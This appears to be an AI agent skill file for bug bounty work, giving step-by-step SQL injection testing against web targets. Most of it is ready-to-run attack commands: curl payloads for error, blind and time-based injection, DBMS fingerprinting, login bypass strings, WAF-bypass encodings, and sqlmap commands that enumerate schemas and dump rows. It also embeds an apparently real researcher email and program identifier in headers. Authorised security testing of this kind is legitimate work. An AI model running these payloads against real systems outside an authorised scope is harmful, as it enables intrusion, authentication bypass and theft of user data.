---
name: sqli-tester
description: Find and confirm SQL injection vulnerabilities — error-based, blind boolean, blind time-based, union-based, and out-of-band — with focus on data extraction and authentication bypass. Use when hypothesis-agent identifies database query parameters, search endpoints, login forms, or ordering/filtering inputs. Trigger on phrases like "test SQL injection", "SQLi", "database injection", "blind SQLi", "test this param for injection", or any time there's a param that might reach a SQL query.
allowed-tools: Bash
---

# SQLi Tester

Target: $ARGUMENTS (URL, endpoint, or ~/bugbounty/target/recon/)

All commands run directly in Kali WSL.

---

## Hard Stop Rules

Do NOT pursue:
- Second-order SQLi that requires admin interaction to trigger — not realistic
- SQLi that only reads data the attacker already has access to
- Time-based blind SQLi where the delay is < 3x baseline (too noisy to confirm)
- Error messages that contain SQL syntax but no actual injection — these are just verbose errors
- NoSQL injection in MongoDB/Redis unless you have confirmed data extraction path

Minimum impact to pursue: read sensitive data (PII, credentials, other users' records) OR authentication bypass OR write/delete capability.

Tools required: `sqlmap` (check before starting).

---

## Step 0 — Setup

```bash
export PATH=$PATH:~/go/bin
cat ~/bugbounty/knowledge/weak-patterns.md 2>/dev/null
which sqlmap || (pip3 install sqlmap --break-system-packages 2>/dev/null || sudo apt install sqlmap -y)
```

If target is a directory, find injection candidates:

```bash
grep -rh "search\|filter\|order\|sort\|id=\|user=\|name=\|category=" "$ARGUMENTS"/*.md 2>/dev/null | grep -oP 'https?://[^\s"]+[?&][a-zA-Z_]+=[^&\s"]+' | sort -u | head -20
```

---

## Step 1 — Identify Injection Candidates

**High-value targets (most likely to be injectable):**

1. **Numeric IDs** — `?id=1`, `?user_id=42` — direct row lookup, often no sanitization
2. **Search/filter params** — `?q=test`, `?name=john`, `?category=shoes`
3. **Ordering/sorting params** — `?order=name`, `?sort=desc` — ORDER BY injection often unparameterized
4. **Login forms** — username/password fields
5. **API JSON bodies** — `{"id": 1}`, `{"filter": "active"}` — less tested
6. **XML/SOAP inputs** — if the target uses SOAP APIs

**Quick manual injection test — error-based:**

```bash
# Test a single-quote to trigger SQL error
TARGET_PARAM="id"
TARGET_VAL="1'"

curl -s "https://TARGET/path?$TARGET_PARAM=$TARGET_VAL" \
  -H "Cookie: SESSION" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  | grep -iE "(sql|syntax|mysql|postgres|ora|sqlite|db error|quoted string|unterminated)" | head -10
```

**Quick boolean-based test:**

```bash
# Both queries below should return DIFFERENT results if injectable
# True condition (same as original)
curl -s "https://TARGET/path?id=1 AND 1=1--" -H "Cookie: SESSION" | wc -c

# False condition (should return empty or error)
curl -s "https://TARGET/path?id=1 AND 1=2--" -H "Cookie: SESSION" | wc -c
```

If response sizes differ significantly → boolean blind injection confirmed.

**Quick time-based test:**

```bash
# Baseline time
time curl -s "https://TARGET/path?id=1" -H "Cookie: SESSION" > /dev/null

# Inject time delay — MySQL
time curl -s "https://TARGET/path?id=1 AND SLEEP(5)--" -H "Cookie: SESSION" > /dev/null

# PostgreSQL
time curl -s "https://TARGET/path?id=1; SELECT pg_sleep(5)--" -H "Cookie: SESSION" > /dev/null
```

If second request takes ≥5 seconds more than baseline → time-based blind confirmed.

---

## Step 2 — Determine Database Type

Once injection is confirmed, fingerprint the DBMS:

```bash
# MySQL
curl -s "https://TARGET/path?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" -H "Cookie: SESSION" | grep -oP '~[^<"]+' | head -3

# PostgreSQL
curl -s "https://TARGET/path?id=1 AND 1=CAST(VERSION() AS INT)--" -H "Cookie: SESSION" | grep -i "invalid\|postgres" | head -3

# MSSQL
curl -s "https://TARGET/path?id=1 AND 1=CONVERT(INT,@@VERSION)--" -H "Cookie: SESSION" | grep -i "microsoft\|sql server" | head -3

# SQLite
curl -s "https://TARGET/path?id=1 AND 1=CAST(SQLITE_VERSION() AS INT)--" -H "Cookie: SESSION" | grep -i "sqlite" | head -3
```

---

## Step 3 — Run SQLMap (for confirmed injection points)

Only run sqlmap AFTER manual confirmation to avoid alerting WAFs unnecessarily.

```bash
# Basic extraction — current database and user
sqlmap -u "https://TARGET/path?id=1" \
  --cookie "SESSION_COOKIE" \
  --headers "bugcrowd-id: cnsecconsultingptyltd@gmail.com\nflatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  --level=2 --risk=1 \
  --current-db --current-user \
  --batch \
  --output-dir="$HOME/bugbounty/TARGET/sqli-$(date +%Y%m%d)" \
  2>&1 | tail -30

# For JSON POST endpoints
sqlmap -u "https://TARGET/api/search" \
  --data '{"query":"test","id":1}' \
  --cookie "SESSION_COOKIE" \
  -p id \
  --level=2 --risk=1 \
  --current-db \
  --batch \
  --output-dir="$HOME/bugbounty/TARGET/sqli-$(date +%Y%m%d)"

# For authenticated endpoints requiring CSRF
sqlmap -u "https://TARGET/path?id=1" \
  --cookie "SESSION_COOKIE" \
  --csrf-token="X-Csrf-Token" \
  --csrf-url="https://TARGET/" \
  --level=2 --risk=1 \
  --current-db \
  --batch
```

**Do NOT use `--level=5 --risk=3` or `--dump-all` in bug bounty** — this is destructive and will get you banned.

---

## Step 4 — Data Extraction (PoC only — minimal data)

Extract just enough to prove impact. **Do not exfiltrate real user data beyond what's needed to confirm the finding.**

```bash
# List databases
sqlmap -u "https://TARGET/path?id=1" --cookie "SESSION" --dbs --batch

# List tables in the app database
sqlmap -u "https://TARGET/path?id=1" --cookie "SESSION" -D app_database --tables --batch

# Dump only schema of interesting tables (no actual data)
sqlmap -u "https://TARGET/path?id=1" --cookie "SESSION" -D app_database -T users --columns --batch

# Dump a SINGLE row for PoC — NOT an entire table
sqlmap -u "https://TARGET/path?id=1" --cookie "SESSION" -D app_database -T users -C id,email --start=1 --stop=1 --dump --batch
```

**For the PoC:** dump your OWN test account row only. One row is enough. Never dump real user data.

---

## Step 5 — Authentication Bypass (if applicable)

Test login forms for classic bypass:

```bash
# Classic bypass
curl -s -X POST "https://TARGET/login" \
  -d "username=admin'--&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded" | grep -i "welcome\|dashboard\|logged in"

# Boolean bypass
curl -s -X POST "https://TARGET/login" \
  -d "username=admin' OR '1'='1'--&password=x" | grep -i "welcome\|dashboard"
```

If successful → note that you've bypassed authentication. Stop here — don't enumerate other accounts. This single login bypass is the PoC.

---

## Step 6 — ORDER BY Injection

Sorting parameters are frequently unparameterized:

```bash
# Test order parameter
curl -s "https://TARGET/api/listings?sort=name" | wc -c
curl -s "https://TARGET/api/listings?sort=name,SLEEP(5)--" | wc -c  # check timing
curl -s "https://TARGET/api/listings?sort=(SELECT+SLEEP(5))" | wc -c  # check timing

# Error-based extraction via ORDER BY
curl -s "https://TARGET/api/listings?sort=EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))" \
  | grep -oP '~[^<"]+'
```

---

## Step 7 — WAF Detection and Bypass Assessment

If injection attempts return 403/WAF blocks:

```bash
# Check WAF type from headers
curl -sI "https://TARGET/" | grep -iE "x-powered-by|server|x-waf|cloudflare|akamai|aws"

# Common WAF bypass encodings (try one at a time, note which gets through)
# URL double-encoding
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote(\"1' AND 1=1--\")))")

# Case variation (MySQL is case-insensitive)
curl -s "https://TARGET/path?id=1+AnD+SlEeP(5)--"

# Comment variation
curl -s "https://TARGET/path?id=1/*!AND*/SLEEP(5)--"
curl -s "https://TARGET/path?id=1/**/AND/**/SLEEP(5)--"
```

If WAF blocks all bypass attempts → document the WAF, log to weak-patterns, move on. Don't spend more than 30 minutes on WAF bypass.

---

## Step 8 — Document and Triage

Write to `~/bugbounty/TARGET/findings/SQLi-$(date +%Y%m%d)-PARAMETER.md`:

```bash
cat > ~/bugbounty/TARGET/findings/SQLi-$(date +%Y%m%d)-PARAM.md << 'EOF'
# SQL Injection — [Parameter] — [Type: Error/Blind/Union]

**Date:** YYYY-MM-DD  
**URL:** https://TARGET/path?param=PAYLOAD  
**Type:** Error-based / Boolean blind / Time-based blind / Union-based  
**DBMS:** MySQL / PostgreSQL / MSSQL / SQLite  
**Severity:** High / Critical

## Reproduction

**Manual confirmation:**
```
GET /path?id=1'+AND+1=1-- HTTP/1.1
→ Response contains [normal content]

GET /path?id=1'+AND+1=2-- HTTP/1.1
→ Response contains [empty/error]
```

**SQLMap output:**
```
[paste sqlmap confirmation lines]
```

**PoC — confirmed data extraction (own test account only):**
```
[one row from own account, schema of users table]
```

## Impact
Database: [name]  
Tables accessible: [count or names]  
Impact: [read all user data / auth bypass / write capability]

## Notes
[WAF present? ORM in use? Parameterized elsewhere? Auth required?]
EOF
```

Run `/triager` before submission.

---

## Log Confirmed-Safe Patterns

```bash
cat >> ~/bugbounty/knowledge/weak-patterns.md << 'EOF'

## $(date +%Y-%m-%d) — Confirmed protected: [param] on [target]
**Result:** ORM/parameterized query — no injection possible
**Pattern:** SQLi attempt
**Lesson:** [target] uses [Rails ActiveRecord / Django ORM / etc.] which parameterizes by default
EOF
```
